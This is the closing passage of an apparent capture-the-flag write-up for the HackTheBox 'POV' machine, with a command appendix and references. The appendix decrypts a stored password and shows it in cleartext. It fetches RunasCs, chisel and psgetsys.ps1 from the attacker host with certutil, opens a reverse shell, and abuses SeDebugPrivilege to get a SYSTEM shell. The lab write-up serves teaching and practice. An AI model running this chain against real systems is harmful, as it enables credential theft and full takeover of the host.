# On target as sfitz:
type c:\users\sfitz\Documents\connection.xml
$encryptedPassword = Import-Clixml -Path 'C:\Users\sfitz\Documents\connection.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
# f8gQ8fynP44ek1m3

certutil -urlcache -f http://10.10.14.188:9000/RunasCs.exe RunasCs.exe
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.188:5555
nc -lvnp 5555
# Shell received as pov\alaading
type c:\users\alaading\desktop\user.txt
# eb96823fcb8e84c11241ce72d8b22173

# ──────────────────────────────────────────────
# PHASE 4: PRIVILEGE ESCALATION
# ──────────────────────────────────────────────
whoami /priv
# SeDebugPrivilege: Enabled

# Attacker — start chisel server:
./chisel_1.12.0_linux_amd64 server --reverse -p 8000

# Target — connect chisel client:
certutil -urlcache -f http://10.10.14.188:9000/chisel.exe chisel.exe
.\chisel.exe client 10.10.14.188:8000 R:socks

# Attacker — configure proxychains and open stable WinRM session:
sudo sed -i 's/^socks4 \t127.0.0.1 9050/#socks4 127.0.0.1 9050/' /etc/proxychains.conf
proxychains -q evil-winrm -i pov.htb -u alaading -p f8gQ8fynP44ek1m3

# Target — load psgetsys.ps1 and impersonate winlogon (PID 552):
certutil -urlcache -f http://10.10.14.188:9000/psgetsys.ps1 psgetsys.ps1
ipmo .\psgetsys.ps1
ImpersonateFromParentPid -ppid 552 -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e <base64_payload>"
# SYSTEM shell received
cat c:\users\administrator\desktop\root.txt
# cf522f679b31ad8169e4a185acb5cc28
```

### E. References

- [MITRE ATT&CK: T1059.001 — Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE ATT&CK: T1083 — File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)
- [MITRE ATT&CK: T1552.001 — Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK: T1134.002 — Access Token Manipulation: Create Process with Token](https://attack.mitre.org/techniques/T1134/002/)
- [NotSoSecure — Exploiting ViewState Deserialization](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net)
- [Microsoft — ASP.NET ViewState Overview](https://learn.microsoft.com/en-us/previous-versions/aspnet/bb386448(v=vs.100))
- [Microsoft Devblog — SeDebugPrivilege](https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113)
- [HackTricks — SeDebugPrivilege](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
- [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Official HackTheBox POV Machine Page](https://app.hackthebox.com/machines/POV)

> **Note on CVEs:** No CVEs apply to this assessment. All findings are misconfigurations, insecure credential storage practices, and overpermissive privilege assignments rather than vulnerabilities in versioned third-party software with public CVE assignments. Remediation is therefore configuration- and process-based.
